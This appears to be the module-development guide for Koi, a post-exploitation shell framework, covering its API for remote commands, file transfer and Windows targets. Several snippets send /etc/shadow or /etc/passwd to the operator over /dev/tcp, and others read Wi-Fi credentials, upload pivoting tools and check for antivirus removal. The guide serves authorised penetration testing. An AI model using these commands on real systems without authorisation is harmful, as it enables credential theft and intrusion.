# Koi - Module Development Guide

## Overview

Koi modules are self-contained Python classes that extend `KoiModule`. Each module represents one capability (enumeration, file transfer, pivoting, etc.) and is automatically discovered by the framework when placed in `src/koi/modules/`.

A module gets a live `Session` object injected at construction time. Through the base class it has access to helpers for executing remote commands, transferring files, printing output, and managing the connection - without ever touching the raw socket directly.

---

## The Blueprint - KoiModule Base Class

`KoiModule` (defined in `blueprint.py`) is the abstract base class every module must inherit from. It handles argument parsing, provides all helpers, and enforces the single entry point `run()`.

```python
from koi.modules.blueprint import KoiModule

class MyModule(KoiModule):
    name        = "my_module"
    description = "Does something cool."

    def run(self) -> None:
        result = self.exec("whoami")
        self.ok(f"Running as: {result.stdout.strip()}")
```

### Class Attributes

These are declared at class level and define the module's identity and behaviour inside the CLI:

| Attribute | Type | Required | Description |
|-----------|------|----------|-------------|
| `name` | `str` | Yes | Short identifier used to call the module (`module run <name>`) |
| `description` | `str` | Yes | One-line summary shown in `module list` |
| `usage` | `str` | No | Longer help string shown by `module help <name>` |
| `category` | `str` | No | Grouping label in the UI (e.g. `"Enumeration"`, `"Pivoting"`) |
| `platform` | `str` or `list[str]` | No | Supported OS types - see [Platform Targeting](#platform-targeting) |
| `arguments` | `list[dict]` | No | Argument definitions - see [Argument Parsing](#argument-parsing) |

### Lifecycle

```
KoiModule.__init__(session, args)
  └─ _parse_args()          # builds self.args from self.arguments + raw CLI args
       └─ run()             # YOUR code - called by the framework
```

The framework calls `__init__` then `run()`. You never override `__init__`; put all logic in `run()`.

### Argument Parsing

Arguments are declared as a list of dicts under the `arguments` class attribute. Each dict mirrors the keyword arguments of `argparse.add_argument`, plus a mandatory `"flags"` key.

```python
arguments = [
    # Positional argument (no leading "-")
    {
        "flags":  ["remote_path"],
        "help":   "Path on the remote target",
        "nargs":  "+",          # collect multiple words into a list
    },
    # Optional flag with a default
    {
        "flags":   ["-o", "--output"],
        "default": None,
        "help":    "Local output path",
    },
    # Boolean flag
    {
        "flags":   ["-a", "--all"],
        "action":  "store_true",
        "default": False,
        "help":    "Show all items",
    },
]
```

After parsing, arguments are accessible via `self.args`:

```python
def run(self) -> None:
    path = " ".join(self.args.remote_path)  # positional with nargs="+"
    out  = self.args.output                 # optional flag
    all_ = self.args.all                    # boolean flag
```

Raw (unparsed) arguments are also available as `self.raw_args` (a `list[str]`), but prefer `arguments` + `self.args` for all flags - it gives you proper help text, type coercion, and consistency with the rest of the framework.

---

## Core API Reference

All helpers are available as `self.<method>` inside `run()`.

### Executing Commands

#### `self.exec(command, timeout=30.0) -> CommandResult`

Runs a shell command on the remote Linux session and blocks until it completes or times out. Returns a `CommandResult` with:

- `.stdout` - full output as a string
- `.returncode` - exit code
- `.success` - `True` if `returncode == 0`
- `.duration` - elapsed time in seconds

```python
result = self.exec("id")
if result.success:
    self.ok(result.stdout.strip())
else:
    self.err(f"Command failed (rc={result.returncode})")
```

Raises `CommandTimeout` if the command exceeds `timeout` seconds.

> **Note:** `exec` uses a sentinel marker appended to the command, so it works correctly even on raw/non-PTY shells. **Do not use it on Windows sessions** - use `_win_query` instead.

#### `self.exec_stream(command, timeout=30.0) -> Iterator[StreamLine]`

Like `exec` but yields output line by line as `StreamLine` objects (`.text` attribute). Useful for long-running commands where you want to display progress in real time.

```python
for line in self.exec_stream("find / -name '*.conf' 2>/dev/null"):
    self.notify("info", line.text)
```

#### `self._exec_clean(cmd, timeout=10.0) -> str`

Runs a Linux command and collects its output via a **side TCP channel** instead of reading it from the shell stream. This is the preferred method when the output needs to be parsed programmatically, because it bypasses any prompt noise or ANSI codes.

```python
arch = self._exec_clean("uname -m")
size = self._exec_clean(f"wc -c < {quoted_path}")
```

Internally it redirects stdout to `/dev/tcp/<local_ip>/<port>` and collects the bytes on a local socket.

#### `self._try_exec(cmd, timeout=10.0) -> str`

Like `_exec_clean` but silently returns an empty string on any error instead of raising. Useful for optional or best-effort commands where a missing tool or empty output is acceptable.

```python
wpa = self._try_exec("cat /etc/wpa_supplicant/wpa_supplicant.conf", timeout=8)
if wpa:
    # parse credentials
```

### Windows Helpers

#### `self._win_query(ps_expr, timeout=10.0) -> str`

Evaluates a PowerShell expression on a **Windows** target and returns its string output. Handles both plain and upgraded (ConPtyShell) sessions transparently:

- On plain sessions it injects a sentinel marker to delimit the output inline.
- On upgraded sessions it uses a side-channel TCP socket (see `_win_query_sidechannel`) to bypass the VT100 stream.

```python
# Check file existence
exists = self._win_query(f"(Test-Path '{path}').ToString()")
# -> "True" or "False"

# Get file size
size = self._win_query(f"(Get-Item '{path}').Length")

# Run arbitrary PowerShell and capture output
output = self._win_query("(Get-LocalUser) | Select-Object Name | Out-String")
```

> **Always use `_win_query` instead of `exec` on Windows sessions.**

### File Transfer Helpers

These helpers are available as `self.<method>` inside `run()`.

#### `self._upload_bytes(raw, dest, timeout=30.0, on_progress=None) -> bool`

Transfers `raw` bytes to `dest` on the target, handling Linux and Windows automatically. Returns `False` on TCP error.

```python
bar = self.ui.ProgressBar(total=len(raw))
ok  = self._upload_bytes(raw, "./agent", timeout=60, on_progress=bar.update)
bar.done()
print()
if not ok:
    self.err("Upload failed.")
    return
```

- On **Linux** it uses `/dev/tcp/<ip>/<port>` via `cat`.
- On **Windows** it sends a PowerShell TCP-read command via `_dispatch_ps`.
- Relative paths (e.g. `./agent`, `.\agent.exe`) are resolved against the remote shell's current working directory.

Post-transfer verification (e.g. `test -s`, `Test-Path`, `chmod +x`) is the caller's responsibility.

#### `self._dispatch_ps(ps_cmd) -> None`

Sends an arbitrary PowerShell command to the session, routing correctly for both plain and upgraded (ConPtyShell) sessions.

```python
ps = f"Remove-Item -Force '{path}' -ErrorAction SilentlyContinue"
self._dispatch_ps(ps)
```

Use this when you need to fire a PS command that has no return value and doesn't go through `_win_query`. Commands sent via `_dispatch_ps` are logged automatically.

#### `spawn_recv_server(timeout) -> (port, collect_fn)`

Opens a local TCP listener on a random port. Used when you want the **remote machine to push data to you** (download).

```python
from koi.utils.tcp import spawn_recv_server

port, collect = spawn_recv_server(timeout=30)
self.exec(f"cat /etc/passwd > /dev/tcp/{local_ip}/{port}")
data = collect()   # bytes
```

#### TCPReceiveServer

A class-based alternative to `spawn_recv_server` that provides a cleaner interface and built-in progress tracking. Import it from `blueprint`:

```python
from koi.modules.blueprint import KoiModule, TCPReceiveServer
```

**Constructor:**

```python
TCPReceiveServer(timeout=30.0, on_progress=None)
```

| Parameter | Description |
|---|---|
| `timeout` | Seconds to wait for a connection and complete transfer |
| `on_progress` | Optional callback `fn(bytes_received: int)` called after each chunk |

**Methods:**

| Method | Returns | Description |
|---|---|---|
| `.start()` | `self` | Binds the socket, starts the background thread. Sets `.port`. |
| `.collect()` | `bytes` | Blocks until transfer completes. Raises `RuntimeError` or `TimeoutError` on failure. |
| `.stop()` | - | Closes the socket. Called automatically on context manager exit. |

**As a context manager:**

```python
with TCPReceiveServer(timeout=30) as srv:
    port = srv.port
    self.exec(f"cat /etc/shadow > /dev/tcp/{local_ip}/{port}")
    data = srv.collect()
```

**With progress bar:**

```python
bar = self.ui.ProgressBar(total=file_size)
srv = TCPReceiveServer(timeout=30, on_progress=bar.update).start()
port = srv.port
# … trigger remote transfer …
raw = srv.collect()
bar.done()
```

### Output & Notifications

#### `self.ok(msg)` / `self.err(msg)` / `self.warn(msg)` / `self.status(msg)` / `self.success(msg)`

Print a styled notification line. Choose the level that matches the semantics:

| Method | When to use |
|--------|-------------|
| `ok` | Neutral informational line |
| `status` | Ongoing progress step |
| `success` | Operation completed successfully |
| `warn` | Non-fatal issue worth noting |
| `err` | Error - typically followed by `return` |

#### `self.box(title, data: dict)`

Prints a formatted report box. Keys are labels, values are the corresponding data.

```python
self.box("Download complete", {
    "remote path": remote_path,
    "local path":  os.path.abspath(local_path),
    "size":        f"{len(raw)} bytes",
})
```

#### `self.spinner(msg)` - context manager

Shows a spinner while a blocking operation runs.

```python
with self.spinner("Checking file existence"):
    result = self.exec("test -f /etc/shadow")
```

#### `self.breaker(text="")` - context manager / function

Prints a horizontal separator, optionally with a label. Used to frame large text dumps.

#### `self.ui.ProgressBar(total)`

Shows a progress bar. Call `.update(current)` to advance it and `.done()` when finished.

```python
bar = self.ui.ProgressBar(total=file_size)
while chunk := conn.recv(65536):
    buf += chunk
    bar.update(len(buf))
bar.done()
```

### Networking Utilities

#### `self._get_local_ip() -> str`

Returns the local IP address that routes toward the session's remote host. Always use this instead of hardcoding `127.0.0.1`.

```python
local_ip = self._get_local_ip()
```

#### `self.send(data: bytes) -> bool`

Write raw bytes directly to the session socket. Returns `False` if the session is dead.

#### `self.sendline(line: str, encoding="utf-8") -> bool`

Encode `line + "\n"` and send it. Shorthand for `self.send((line + "\n").encode(encoding))`.

---

### Local Cache

Koi provides a simple key-value file cache under `~/.koi/cache/`. Use it to avoid re-downloading large files (binaries, scripts) across runs.

```python
from koi.utils.cache import put_cache, get_cache, has_cache, cache_path
```

#### `put_cache(name, data) -> None`

Store `data` (bytes) in the cache under `name`.

```python
put_cache("my_tool.exe", raw_bytes)
```

#### `get_cache(name) -> bytes | None`

Return cached bytes for `name`, or `None` if not cached.

```python
raw = get_cache("my_tool.exe")
if raw is None:
    raw = download_from_github()
    put_cache("my_tool.exe", raw)
```

#### `has_cache(name) -> bool`

Return `True` if `name` exists in the cache.

#### `cache_path(name) -> Path`

Return the full path of the cached file. Useful for displaying the cache location in notifications.

```python
notify('warning', f"Using cached version ({cache_path('my_tool.exe')})")
```

---

## Writing Your First Module

Here is a minimal working module skeleton:

```python
from koi.modules.blueprint import KoiModule


class HelloModule(KoiModule):
    name        = "hello"
    description = "Say hello from the remote machine."
    usage       = "hello <id>"
    category    = "Example"
    platform    = "linux"

    def run(self) -> None:
        with self.spinner("Running whoami"):
            result = self.exec("whoami")

        if not result.success:
            self.err("Could not run whoami.")
            return

        user = result.stdout.strip()
        self.box("Hello from the target", {
            "user": user,
            "host": self.session.addr[0],
        })
```

Save it as `src/koi/modules/hello.py`. The framework auto-discovers it.

---

## Platform Targeting

The `platform` attribute controls on which session types the module can be called.

| Value | Description |
|-------|-------------|
| `"any"` | Works on all sessions (default) |
| `"linux"` | Linux shell only |
| `"windows_ps"` | Windows PowerShell only |
| `"windows_cmd"` | Windows cmd.exe only |
| `["linux", "windows_ps"]` | Both Linux and Windows PS |

The framework calls `KoiModule.supports(os_type)` before loading the module. If the session's OS doesn't match, the module won't be offered.

Inside `run()` you can check `self.session.os_type` to branch between Linux and Windows code paths:

```python
def run(self) -> None:
    if self.session.os_type == "linux":
        self._run_linux()
    else:
        self._run_windows()
```

---

## Real-World Examples

### Simple Linux Module - get_users

`get_users` is the simplest possible module: one `exec` call, parse stdout, display.

```python
def run(self) -> None:
    result = self.exec("cat /etc/passwd")
    if not result.success:
        self.err(f"Could not read /etc/passwd (rc={result.returncode})")
        return

    users = {}
    for line in result.stdout.splitlines():
        parts = line.split(":")
        if len(parts) < 7:
            continue
        username, _, uid, _, _, _, shell = parts[:7]
        users[username] = f"uid={uid}  shell={shell}"

    if self.args.all:
        self.box(f"All users ({len(users)})", users)
    interesting = {u: v for u, v in users.items()
                   if any(s in v for s in ["/bin/bash", "/bin/sh", "/bin/zsh"])}
    if interesting:
        self.box(f"Interesting users ({len(interesting)})", interesting)
```

With the corresponding `arguments` declaration:

```python
arguments = [
    {
        "flags":  ["-a", "--all"],
        "action": "store_true",
        "default": False,
        "help":   "Show all users, not just those with a login shell.",
    },
]
```

**Key takeaways:**
- Use `self.exec()` for Linux commands.
- Check `result.success` before processing output.
- Declare all flags via `arguments` - access them with `self.args`.

---

### Cross-platform Module - get_processes

`get_processes` demonstrates the standard cross-platform pattern: branch on `self.session.os_type`, use `_exec_clean` for Linux and `_win_query` for Windows.

```python
def run(self) -> None:
    if self.session.os_type == "linux":
        self._run_linux()
    else:
        self._run_windows()

def _run_linux(self) -> None:
    with self.spinner("Collecting processes"):
        raw = self._exec_clean(
            "ps aux --no-headers 2>/dev/null || ps aux 2>/dev/null",
            timeout=15,
        )
    procs = self._parse_linux(raw)
    #  display with self.box()

def _run_windows(self) -> None:
    ps_expr = "(tasklist /fo csv /nh /v) -join '§'"
    with self.spinner("Collecting processes via tasklist"):
        raw = self._win_query(ps_expr, timeout=30)
    procs = self._parse_windows_tasklist(raw)
    #  display with self.box()
```

**Key takeaways:**
- Use `_exec_clean` instead of `exec` when you need to parse the output programmatically - it gives you clean text free of prompt noise.
- Use `_win_query` for all Windows queries; never use `exec` on a Windows session.
- Wrap slow queries in `self.spinner()`.

---

### File Transfer Module - download

`download` shows how to use `TCPReceiveServer` to collect a file sent by the remote machine.

```python
from koi.modules.blueprint import KoiModule, TCPReceiveServer

# 1. Open a local TCP listener with optional progress tracking
bar  = self.ui.ProgressBar(total=remote_size or 0)
srv  = TCPReceiveServer(timeout=30, on_progress=bar.update).start()
port = srv.port

# 2. Tell the remote machine to send the file
if os_type == "linux":
    self.exec(f"cat {quoted} > /dev/tcp/{local_ip}/{port}", timeout=30)
else:
    self._dispatch_ps(ps_cmd)  # PowerShell TcpClient write

# 3. Collect and write to disk
try:
    raw = srv.collect()   # blocks; raises RuntimeError/TimeoutError on failure
except (RuntimeError, TimeoutError) as exc:
    self.err(f"Transfer failed: {exc}")
    return
bar.done()

with open(local_path, "wb") as f:
    f.write(raw)
```

`TCPReceiveServer` handles the socket lifecycle, the background thread, and error propagation. See [TCPReceiveServer](#tcpreceiveserver) below.

---

### Windows Upload Module - ligolo / sharphound / populate_win

All three upload modules follow the same pattern:

1. Prepare the binary locally (download from GitHub, extract from zip, etc.)
2. Call `self._upload_bytes(raw, dest, timeout=...)` to transfer.
3. Verify the file landed with `_win_query("(Test-Path ...)")` — AV may silently delete it.

```python
def run(self) -> None:
    # ... fetch raw bytes ...

    ok = self._upload_bytes(raw, dest, timeout=60)
    if not ok:
        self.err("Transfer failed.")
        return

    time.sleep(1.0)   # give AV time to act before checking
    check = self._win_query(f"(Test-Path '{dest}').ToString()")
    if check.strip().lower() != "true":
        self.err("File not present after upload, likely removed by AV.")
        return

    self.ok(f"Uploaded to {dest}")
```

`_upload_bytes` handles the TCP server, the PowerShell command, and upgraded vs plain session routing automatically.

---

## Common Patterns

### Side-channel TCP transfer

Direct use of the shell stream for data is fragile (encoding issues, prompt pollution, ANSI sequences). Koi always uses a **side TCP channel** for data:

- **Download (remote -> local):** open a local listener -> give port to remote -> remote does `cat file > /dev/tcp/ip/port` or PowerShell TcpClient write.
- **Upload (local -> remote):** `spawn_send_server` serves the bytes locally -> remote does PowerShell TcpClient read -> write to file.

This works reliably on both raw shells and upgraded ConPTY sessions.

### Detecting upgraded sessions

An "upgraded" session is one that has been promoted to a full ConPTY session via `ConPtyShell`. Upgraded sessions emit raw VT100 output, so inline sentinel-based output parsing is unreliable. The flag is `self.session.upgraded`.

```python
if self.session.upgraded:
    # Use side-channel
    ...
else:
    # Inline sentinel is fine
    ...
```

`_win_query` handles this transparently - you don't need the check there. For sending arbitrary PS commands without a return value, use `_dispatch_ps` — it routes correctly for both upgraded and plain sessions automatically:

```python
self._dispatch_ps(f"Remove-Item -Force '{path}' -ErrorAction SilentlyContinue")
```

### Handling both upgraded and plain sessions on Windows

Use `_dispatch_ps` for fire-and-forget PS commands, and `_upload_bytes` for file transfers. Both are in the base class and handle the upgraded/plain split internally — you don't need to implement it yourself.

---

## Error Handling Best Practices

- Always call `self.err(msg)` and then **`return`** immediately - don't continue after an error.
- Wrap network calls (`urllib`, `socket`) in `try/except` blocks and surface the exception message with `self.err`.
- After an upload, always verify the file exists with `_win_query("(Test-Path )")` or `exec("test -f ")` - AV/EDR may silently delete the binary.
- If a module leaves behind a temporary workspace on the target (e.g. `C:\Windows\Temp\sh_xxxx`), implement a `_cleanup()` method and call it both on success and on early exit.

```python
def run(self) -> None:
    if not self._upload(raw, dest):
        self.err("Upload failed.")
        self._cleanup(work_dir)   # always clean up
        return

    # rest of the logic

    self._cleanup(work_dir)
    self.success("Done.")

def _cleanup(self, work_dir: str) -> None:
    try:
        self._win_query(f"Remove-Item -Recurse -Force '{work_dir}' -ErrorAction SilentlyContinue")
    except Exception:
        pass
```

---

## Checklist Before Submitting a Module

- [ ] Class inherits from `KoiModule` and is in `src/koi/modules/`
- [ ] `name`, `description`, and `platform` are set correctly
- [ ] `run()` is implemented
- [ ] `exec()` is only called on Linux sessions; `_win_query()` for Windows
- [ ] File uploads use `self._upload_bytes()` — do not reimplement the TCP transfer manually
- [ ] Arbitrary PS commands use `self._dispatch_ps()` — do not call `session.conn.sendall()` directly
- [ ] Upgraded-session compatibility is handled automatically via `_win_query`, `_upload_bytes`, or `_dispatch_ps`